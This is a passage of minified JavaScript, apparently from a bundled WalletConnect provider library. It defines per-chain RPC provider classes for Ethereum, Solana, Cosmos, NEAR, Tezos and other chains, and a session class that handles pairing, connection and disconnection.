                this.httpProviders[e] || this.setHttpProvider(parseInt(e), t),
                this.chainId = parseInt(e),
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId.toString();
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            createHttpProvider(e, t) {
                const r = t || zE("".concat(this.name, ":").concat(e), this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = parseInt(VE(t));
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            getHttpProvider() {
                const e = this.chainId
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            async handleSwitchChain(e) {
                var t, r;
                let n = e.request.params ? null == (t = e.request.params[0]) ? void 0 : t.chainId : "0x0";
                n = n.startsWith("0x") ? n : "0x".concat(n);
                const o = parseInt(n, 16);
                if (this.isChainApproved(o))
                    this.setDefaultChain("".concat(o));
                else {
                    if (!this.namespace.methods.includes("wallet_switchEthereumChain"))
                        throw new Error("Failed to switch to chain 'eip155:".concat(o, "'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method."));
                    await this.client.request({
                        topic: e.topic,
                        request: {
                            method: e.request.method,
                            params: [{
                                chainId: n
                            }]
                        },
                        chainId: null == (r = this.namespace.chains) ? void 0 : r[0]
                    }),
                    this.setDefaultChain("".concat(o))
                }
                return null
            }
            isChainApproved(e) {
                return this.namespace.chains.includes("".concat(this.name, ":").concat(e))
            }
            async getCapabilities(e) {
                var t, r, n, o, i;
                const s = null == (r = null == (t = e.request) ? void 0 : t.params) ? void 0 : r[0]
                  , a = (null == (o = null == (n = e.request) ? void 0 : n.params) ? void 0 : o[1]) || []
                  , c = "".concat(s).concat(a.join(","));
                if (!s)
                    throw new Error("Missing address parameter in `wallet_getCapabilities` request");
                const l = this.client.session.get(e.topic)
                  , u = (null == (i = null === l || void 0 === l ? void 0 : l.sessionProperties) ? void 0 : i.capabilities) || {};
                if (null != u && u[c])
                    return null === u || void 0 === u ? void 0 : u[c];
                const d = await this.client.request(e);
                try {
                    await this.client.session.update(e.topic, {
                        sessionProperties: uP(lP({}, l.sessionProperties || {}), {
                            capabilities: uP(lP({}, u || {}), {
                                [c]: d
                            })
                        })
                    })
                } catch (St) {
                    console.warn("Failed to update session with capabilities", St)
                }
                return d
            }
            async getCallStatus(e) {
                var t, r;
                const n = this.client.session.get(e.topic)
                  , o = null == (t = n.sessionProperties) ? void 0 : t.bundler_name;
                if (o) {
                    const t = this.getBundlerUrl(e.chainId, o);
                    try {
                        return await this.getUserOperationReceipt(t, e)
                    } catch (s) {
                        console.warn("Failed to fetch call status from bundler", s, t)
                    }
                }
                const i = null == (r = n.sessionProperties) ? void 0 : r.bundler_url;
                if (i)
                    try {
                        return await this.getUserOperationReceipt(i, e)
                    } catch (ct) {
                        console.warn("Failed to fetch call status from custom bundler", ct, i)
                    }
                if (this.namespace.methods.includes(e.request.method))
                    return await this.client.request(e);
                throw new Error("Fetching call status not approved by the wallet.")
            }
            async getUserOperationReceipt(e, t) {
                var r;
                const n = new URL(e)
                  , o = await fetch(n, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(Iy("eth_getUserOperationReceipt", [null == (r = t.request.params) ? void 0 : r[0]]))
                });
                if (!o.ok)
                    throw new Error("Failed to fetch user operation receipt - ".concat(o.status));
                return await o.json()
            }
            getBundlerUrl(e, t) {
                return "".concat(KA, "?projectId=").concat(this.client.core.projectId, "&chainId=").concat(e, "&bundler=").concat(t)
            }
        }
        var fP = Object.defineProperty
          , pP = (e, t, r) => ( (e, t, r) => t in e ? fP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class gP {
            constructor(e) {
                pP(this, "name", "solana"),
                pP(this, "client"),
                pP(this, "httpProviders"),
                pP(this, "events"),
                pP(this, "namespace"),
                pP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = VE(t);
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var yP = Object.defineProperty
          , mP = (e, t, r) => ( (e, t, r) => t in e ? yP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class bP {
            constructor(e) {
                mP(this, "name", "cosmos"),
                mP(this, "client"),
                mP(this, "httpProviders"),
                mP(this, "events"),
                mP(this, "namespace"),
                mP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(this.chainId))
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = VE(t);
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var vP = Object.defineProperty
          , wP = (e, t, r) => ( (e, t, r) => t in e ? vP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class TP {
            constructor(e) {
                wP(this, "name", "algorand"),
                wP(this, "client"),
                wP(this, "httpProviders"),
                wP(this, "events"),
                wP(this, "namespace"),
                wP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                if (!this.httpProviders[e]) {
                    const r = t || zE("".concat(this.name, ":").concat(e), this.namespace, this.client.core.projectId);
                    if (!r)
                        throw new Error("No RPC url provided for chainId: ".concat(e));
                    this.setHttpProvider(e, r)
                }
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(this.chainId))
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    e[t] = this.createHttpProvider(t, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                return typeof r > "u" ? void 0 : new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var AP = Object.defineProperty
          , EP = (e, t, r) => ( (e, t, r) => t in e ? AP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class PP {
            constructor(e) {
                EP(this, "name", "cip34"),
                EP(this, "client"),
                EP(this, "httpProviders"),
                EP(this, "events"),
                EP(this, "namespace"),
                EP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(this.chainId))
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    const r = this.getCardanoRPCUrl(t)
                      , n = VE(t);
                    e[n] = this.createHttpProvider(n, r)
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            getCardanoRPCUrl(e) {
                const t = this.namespace.rpcMap;
                if (t)
                    return t[e]
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || this.getCardanoRPCUrl(e);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var CP = Object.defineProperty
          , SP = (e, t, r) => ( (e, t, r) => t in e ? CP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class IP {
            constructor(e) {
                SP(this, "name", "elrond"),
                SP(this, "client"),
                SP(this, "httpProviders"),
                SP(this, "events"),
                SP(this, "namespace"),
                SP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = VE(t);
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var BP = Object.defineProperty
          , xP = (e, t, r) => ( (e, t, r) => t in e ? BP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class OP {
            constructor(e) {
                xP(this, "name", "multiversx"),
                xP(this, "client"),
                xP(this, "httpProviders"),
                xP(this, "events"),
                xP(this, "namespace"),
                xP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = VE(t);
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var _P = Object.defineProperty
          , WP = (e, t, r) => ( (e, t, r) => t in e ? _P(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class RP {
            constructor(e) {
                WP(this, "name", "near"),
                WP(this, "client"),
                WP(this, "httpProviders"),
                WP(this, "events"),
                WP(this, "namespace"),
                WP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                if (this.chainId = e,
                !this.httpProviders[e]) {
                    const r = t || zE("".concat(this.name, ":").concat(e), this.namespace);
                    if (!r)
                        throw new Error("No RPC url provided for chainId: ".concat(e));
                    this.setHttpProvider(e, r)
                }
                this.events.emit(ZA, "".concat(this.name, ":").concat(this.chainId))
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e && e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])) || []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    e[t] = this.createHttpProvider(t, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace);
                return typeof r > "u" ? void 0 : new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var kP = Object.defineProperty
          , MP = (e, t, r) => ( (e, t, r) => t in e ? kP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class NP {
            constructor(e) {
                MP(this, "name", "tezos"),
                MP(this, "client"),
                MP(this, "httpProviders"),
                MP(this, "events"),
                MP(this, "namespace"),
                MP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                if (this.chainId = e,
                !this.httpProviders[e]) {
                    const r = t || zE("".concat(this.name, ":").concat(e), this.namespace);
                    if (!r)
                        throw new Error("No RPC url provided for chainId: ".concat(e));
                    this.setHttpProvider(e, r)
                }
                this.events.emit(ZA, "".concat(this.name, ":").concat(this.chainId))
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e && e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])) || []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    e[t] = this.createHttpProvider(t)
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace);
                return typeof r > "u" ? void 0 : new zy(new VA(r))
            }
        }
        var FP = Object.defineProperty
          , UP = (e, t, r) => ( (e, t, r) => t in e ? FP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class DP {
            constructor(e) {
                UP(this, "name", $A),
                UP(this, "client"),
                UP(this, "httpProviders"),
                UP(this, "events"),
                UP(this, "namespace"),
                UP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace.chains = [...new Set((this.namespace.chains || []).concat(e.chains || []))],
                this.namespace.accounts = [...new Set((this.namespace.accounts || []).concat(e.accounts || []))],
                this.namespace.methods = [...new Set((this.namespace.methods || []).concat(e.methods || []))],
                this.namespace.events = [...new Set((this.namespace.events || []).concat(e.events || []))],
                this.httpProviders = this.createHttpProviders()
            }
            requestAccounts() {
                return this.getAccounts()
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider(e.chainId).request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e ? [...new Set(e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])))] : []
            }
            createHttpProviders() {
                var e, t;
                const r = {};
                return null == (t = null == (e = this.namespace) ? void 0 : e.accounts) || t.forEach((e => {
                    const t = Ml(e);
                    r["".concat(t.namespace, ":").concat(t.reference)] = this.createHttpProvider(e)
                }
                )),
                r
            }
            getHttpProvider(e) {
                const t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var LP = Object.defineProperty
          , jP = Object.defineProperties
          , zP = Object.getOwnPropertyDescriptors
          , VP = Object.getOwnPropertySymbols
          , HP = Object.prototype.hasOwnProperty
          , qP = Object.prototype.propertyIsEnumerable
          , GP = (e, t, r) => t in e ? LP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , $P = (e, t) => {
            for (var r in t || (t = {}))
                HP.call(t, r) && GP(e, r, t[r]);
            if (VP)
                for (var r of VP(t))
                    qP.call(t, r) && GP(e, r, t[r]);
            return e
        }
          , KP = (e, t) => jP(e, zP(t))
          , ZP = (e, t, r) => GP(e, "symbol" != typeof t ? t + "" : t, r);
        class YP {
            constructor(e) {
                ZP(this, "client"),
                ZP(this, "namespaces"),
                ZP(this, "optionalNamespaces"),
                ZP(this, "sessionProperties"),
                ZP(this, "scopedProperties"),
                ZP(this, "events", new (Ie())),
                ZP(this, "rpcProviders", {}),
                ZP(this, "session"),
                ZP(this, "providerOpts"),
                ZP(this, "logger"),
                ZP(this, "uri"),
                ZP(this, "disableProviderPing", !1),
                this.providerOpts = e,
                this.logger = typeof (null === e || void 0 === e ? void 0 : e.logger) < "u" && "string" != typeof (null === e || void 0 === e ? void 0 : e.logger) ? e.logger : pt()(Wt({
                    level: (null === e || void 0 === e ? void 0 : e.logger) || HA
                })),
                this.disableProviderPing = (null === e || void 0 === e ? void 0 : e.disableProviderPing) || !1
            }
            static async init(e) {
                const t = new YP(e);
                return await t.initialize(),
                t
            }
            async request(e, t, r) {
                const [n,o] = this.validateChain(t);
                if (!this.session)
                    throw new Error("Please call connect() before request()");
                return await this.getProvider(n).request({
                    request: $P({}, e),
                    chainId: "".concat(n, ":").concat(o),
                    topic: this.session.topic,
                    expiry: r
                })
            }
            sendAsync(e, t, r, n) {
                const o = (new Date).getTime();
                this.request(e, r, n).then((e => t(null, By(o, e)))).catch((e => t(e, void 0)))
            }
            async enable() {
                if (!this.client)
                    throw new Error("Sign Client not initialized");
                return this.session || await this.connect({
                    namespaces: this.namespaces,
                    optionalNamespaces: this.optionalNamespaces,
                    sessionProperties: this.sessionProperties,
                    scopedProperties: this.scopedProperties
                }),
                await this.requestAccounts()
            }
            async disconnect() {
                var e;
                if (!this.session)
                    throw new Error("Please call connect() before enable()");
                await this.client.disconnect({
                    topic: null == (e = this.session) ? void 0 : e.topic,
                    reason: Dg("USER_DISCONNECTED")
                }),
                await this.cleanup()
            }
            async connect(e) {
                if (!this.client)
                    throw new Error("Sign Client not initialized");
                if (this.setNamespaces(e),
                await this.cleanupPendingPairings(),
                !e.skipPairing)
                    return await this.pair(e.pairingTopic)
            }
            async authenticate(e, t) {
                if (!this.client)
                    throw new Error("Sign Client not initialized");
                this.setNamespaces(e),
                await this.cleanupPendingPairings();
                const {uri: r, response: n} = await this.client.authenticate(e, t);
                r && (this.uri = r,
                this.events.emit("display_uri", r));
                const o = await n();
                if (this.session = o.session,
                this.session) {
                    const e = KE(this.session.namespaces);
                    this.namespaces = qE(this.namespaces, e),
                    await this.persist("namespaces", this.namespaces),
                    this.onConnect()
                }
                return o
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            get isWalletConnect() {
                return !0
            }
            async pair(e) {
                const {uri: t, approval: r} = await this.client.connect({
                    pairingTopic: e,
                    requiredNamespaces: this.namespaces,
                    optionalNamespaces: this.optionalNamespaces,
                    sessionProperties: this.sessionProperties,
                    scopedProperties: this.scopedProperties
                });
                t && (this.uri = t,
                this.events.emit("display_uri", t));
                const n = await r();
                this.session = n;
                const o = KE(n.namespaces);
                return this.namespaces = qE(this.namespaces, o),
                await this.persist("namespaces", this.namespaces),
                await this.persist("optionalNamespaces", this.optionalNamespaces),
                this.onConnect(),
                this.session
            }
            setDefaultChain(e, t) {
                try {
                    if (!this.session)
                        return;
                    const [r,n] = this.validateChain(e)
                      , o = this.getProvider(r);
                    o.name === $A ? o.setDefaultChain("".concat(r, ":").concat(n), t) : o.setDefaultChain(n, t)
                } catch (Ot) {
                    if (!/Please call connect/.test(Ot.message))
                        throw Ot
                }
            }
            async cleanupPendingPairings() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                this.logger.info("Cleaning up inactive pairings...");
                const t = this.client.pairing.getAll();
                if (Lg(t)) {
                    for (const r of t)
                        e.deletePairings ? this.client.core.expirer.set(r.topic, 0) : await this.client.core.relayer.subscriber.unsubscribe(r.topic);
                    this.logger.info("Inactive pairings cleared: ".concat(t.length))
                }
            }
            abortPairingAttempt() {
                this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")
            }
            async checkStorage() {
                this.namespaces = await this.getFromStore("namespaces") || {},
                this.optionalNamespaces = await this.getFromStore("optionalNamespaces") || {},
                this.session && this.createProviders()
            }
            async initialize() {
                this.logger.trace("Initialized"),
                await this.createClient(),
                await this.checkStorage(),
                this.registerEventListeners()
            }
            async createClient() {
                var e, t;
                if (this.client = this.providerOpts.client || await OA.init({
                    core: this.providerOpts.core,
                    logger: this.providerOpts.logger || HA,
                    relayUrl: this.providerOpts.relayUrl || "wss://relay.walletconnect.org",
                    projectId: this.providerOpts.projectId,
                    metadata: this.providerOpts.metadata,
                    storageOptions: this.providerOpts.storageOptions,
                    storage: this.providerOpts.storage,
                    name: this.providerOpts.name,
                    customStoragePrefix: this.providerOpts.customStoragePrefix,
                    telemetryEnabled: this.providerOpts.telemetryEnabled
                }),
                this.providerOpts.session)
                    try {
